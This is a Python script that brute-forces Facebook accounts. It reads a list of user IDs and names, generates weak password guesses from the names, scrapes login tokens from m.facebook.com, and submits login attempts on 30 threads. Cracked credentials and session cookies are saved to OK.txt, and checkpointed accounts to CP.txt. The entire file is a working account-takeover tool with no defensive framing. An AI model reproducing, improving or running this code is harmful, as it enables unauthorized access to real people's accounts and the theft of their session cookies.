import re, requests, sys, time, os
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

from rich.tree import Tree
from rich import print as Print

class brute:

   def __init__(self):
       super(brute).__init__()
       self.req = requests.Session()
       self.id = []
       self.ok, self.cp, self.loop = [], [], 0
       self.openfile()

   def openfile(self):
       with open(sys.argv[1], 'r') as baca:
            for x in baca.read().splitlines():
                uid, nama = x.split('<=>')
                self.id.append(x)
       self.next()

   def generate_nama(self, username):
       pwx = []
       for pw in username.split(' '):
           if len(username) <=5:
               pwx.append(pw + '123')
               pwx.append(pw + '1234')
               pwx.append(pw + '12345')
           else:
               if len(pw) == 2 or len(pw) == 3 or len(pw) == 4 or len(pw) ==5:
                  pwx.append(pw + '123')
                  pwx.append(pw + '1234')
                  pwx.append(pw + '12345')
                  pwx.append(username)
               else:
                  pwx.append(pw)
                  pwx.append(pw + '123')
                  pwx.append(pw + '1234')
                  pwx.append(pw + '12345')
                  pwx.append(username)
       return pwx

   def next(self):
       os.system('clear')
       print('total id dari file : {}\n'.format(len(self.id)))
       print('results OK save in file : OK.txt')
       print('results CP save in file : CP.txt\n')
       with ThreadPoolExecutor(max_workers=30) as xx:
           for i in self.id:
               uid,nama = i.split('<=>')
               password = self.generate_nama(nama)
               xx.submit(self.reguler(uid, password))
       exit('\n\nDone.')

   def reguler(self, user, pwe):
       print('\r*--> %s:%s OK:%s CP:%s'%(len(self.id), self.loop, len(self.ok), len(self.cp)), end=' '),
       sys.stdout.flush()
       for pw in pwe:
           try:
               header1 = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; SM-G357FZ Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.0.0.14.82;]","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","accept-encoding": "gzip","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
               link = self.req.get('https://m.facebook.com/',headers=header1).text
               datr = re.search('datrCookie:"(.*?)"', str(link)).group(1)
               Time = re.search(',{serverTime:(.*?),',str(link)).group(1)
               para = re.search('{"consent_param":"(.*?)"', str(link)).group(1)
               coki = "datr={}; consent_param={}; wd=360x560; m_pixel_ratio=2; fr={}; sb={}".format(datr, para, self.req.cookies['fr'], self.req.cookies['sb'])
               header2 = {"Host": "m.facebook.com","content-length": "2154","x-fb-lsd": datr,"sec-ch-ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',"content-type": "application/x-www-form-urlencoded","x-asbd-id": "198387","sec-ch-ua-mobile": "?1","user-agent": UserAgent().chrome,"sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://m.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": coki}
               url = link
               data_info = {"m_ts":re.search('name="m_ts" value="(.*?)"', str(url)).group(1),"li":re.search('name="li" value="(.*?)"', str(url)).group(1),"try_number":"0","unrecognized_tries":"0","email":user,"prefill_contact_point":"100089982196860","prefill_source":"browser_dropdown","prefill_type":"password","first_prefill_source":"browser_dropdown","first_prefill_type":"contact_point","had_cp_prefilled":"true","had_password_prefilled":"true","is_smart_lock":"false","bi_xrwh":"0","bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"encpass":"#PWD_BROWSER:0:{}:{}".format(Time, pw),"fb_dtsg":re.search('"dtsg_ag":{"token":"(.*?)"',str(url)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url)).group(1),"lsd":re.search('"lsd":"(.*?)"',str(url)).group(1),"__csr":"","__req":"5","__a":"AYmPUqkCJGgNsIDrPTT_OBmjpUPMQ5OIpsARzd6irl87z3M_o-4fT8FZ1RRMQEGYIeELeBjkIT-6luVndoZMDImvdIxFkd893laDFYvPSi1yFQ","__user":"0"}
               r = self.req.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data_info, headers=header2, verify=False, allow_redirects=True)
               if 'c_user' in self.req.cookies.get_dict():
                    c_coki = "; ".join([key+'='+value for key, value in self.req.cookies.get_dict().items()])
                    tree = Tree('\r[bold green]					')
                    tree.add('[bold green]{}|{}'.format(user,pw))
                    tree.add('[bold green]{}'.format(c_coki))
                    Print(tree)
                    with open('OK.txt','a', encoding='utf-8') as save:
                       save.write('%s|%s|%s\n'%(user,pw,c_coki))
                    break

               elif 'checkpoint' in self.req.cookies.get_dict():
                    self.cp.append('{}|{}'.format(user,pw))
                    tree = Tree('\r[bold yellow]                          ')
                    tree.add("[bold yellow]{}|{}".format(user,pw))
                    tree.add("[bold yellow]{}".format(self.req.headers['user-agent']))
                    Print(tree)
                    with open('CP.txt','a', encoding='utf-8') as save:
                       save.write('%s|%s\n'%(user,pw))
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError:time.sleep(30)
       self.loop +=1

brute()
